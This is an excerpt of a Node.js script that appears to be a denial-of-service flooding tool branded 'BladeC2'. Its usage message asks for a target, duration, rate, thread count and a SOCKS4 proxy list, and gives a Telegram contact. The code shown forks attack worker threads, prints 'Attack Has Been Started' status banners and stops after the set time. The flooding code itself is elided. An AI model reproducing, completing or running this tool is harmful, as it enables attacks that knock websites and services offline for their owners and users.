...
if (process.argv.length < 7){console.log(`\x1b[38;5;160mnode curse target time rate(\x1b[38;5;255m32\x1b[38;5;160m) thread socks4.txt \x1b[38;5;255m| \x1b[38;5;160mtelegram: \x1b[38;5;255m@imfally`); process.exit();}
const headers = {};
...
if (cluster.isMaster){
 ...
 for (let i = 1; i <= process.argv[5]; i++){
   cluster.fork();
   console.log(`\x1b[38;5;255m[\x1b[38;5;160mBladeC2\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160m\x1b[38;5;255mATTACK\x1b[38;5;160m Include: ${i} Thread(s) ${i} Started`);
 }
 console.log(`\x1b[38;5;255m[\x1b[38;5;160mBladeC2\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mAttack\x1b[38;5;160m Has Been Started`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`\x1b[38;5;255m[\x1b[38;5;160mBladeC2\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160mThe \x1b[38;5;255mAttack\x1b[38;5;160m Is Over`);
   process.exit(1);
 }, process.argv[3] * 1000);
} 
